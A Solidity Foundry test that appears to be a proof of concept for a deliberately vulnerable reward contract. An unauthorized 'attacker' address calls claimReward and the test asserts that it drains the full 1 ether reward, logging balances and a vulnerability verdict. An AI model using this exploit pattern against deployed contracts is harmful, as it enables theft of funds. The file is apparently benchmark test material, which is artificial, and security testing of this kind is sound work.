// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/eth_tx_order_dependence_minimal.sol";

contract EthTxOrderMinimalTest is Test {
    EthTxOrderDependenceMinimal public rewardContract;
    uint256 constant REWARD_AMOUNT = 1 ether;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fund the owner so they can send ETH
        vm.deal(owner, REWARD_AMOUNT);
        
        vm.startPrank(owner);
        rewardContract = new EthTxOrderDependenceMinimal();
        // Set reward with Ether
        rewardContract.setReward{value: REWARD_AMOUNT}();
        vm.stopPrank();
    }

    function test_AnyoneCanClaimReward() public {
        // Record balances BEFORE the attack
        uint256 contractBalanceBefore = rewardContract.getContractBalance();
        uint256 attackerBalanceBefore = attacker.balance;

        console.log("--- BEFORE-Trigger Balance ---");
        console.log("Contract ETH balance: %d", contractBalanceBefore);
        console.log("Attacker ETH balance: %d", attackerBalanceBefore);

        console.log("--- Trigger: Attacker calls claimReward ---");
        vm.prank(attacker);
        rewardContract.claimReward(5);  // Submission ID <10

        // Record balances AFTER the attack
        uint256 contractBalanceAfter = rewardContract.getContractBalance();
        uint256 attackerBalanceAfter = attacker.balance;

        console.log("--- AFTER-Trigger Balance ---");
        console.log("Contract ETH balance: %d", contractBalanceAfter);
        console.log("Attacker ETH balance: %d", attackerBalanceAfter);

        // Compute differences
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        uint256 contractLoss = contractBalanceBefore - contractBalanceAfter;
        console.log("Attacker ETH gain: %d", attackerGain);
        console.log("Contract ETH loss: %d", contractLoss);

        // Vulnerability verification condition: 
        //   Attacker gains exactly REWARD_AMOUNT, contract loses exactly REWARD_AMOUNT and ends at 0.
        bool successfulExploit = (attackerGain == REWARD_AMOUNT) &&
                                 (contractLoss == REWARD_AMOUNT) &&
                                 (contractBalanceAfter == 0);

        // Final verdict
        if (successfulExploit) {
            console.log("Vulnerability Exists: Unauthorized user successfully claimed and received the ETH reward");
        } else {
            console.log("Vulnerability not Exist: Unauthorized transfer amounts do not match expected exploitation");
        }

        // Enforce test result based on verification
        assertTrue(successfulExploit, "Unauthorized claim did not transfer ETH as expected");
    }
}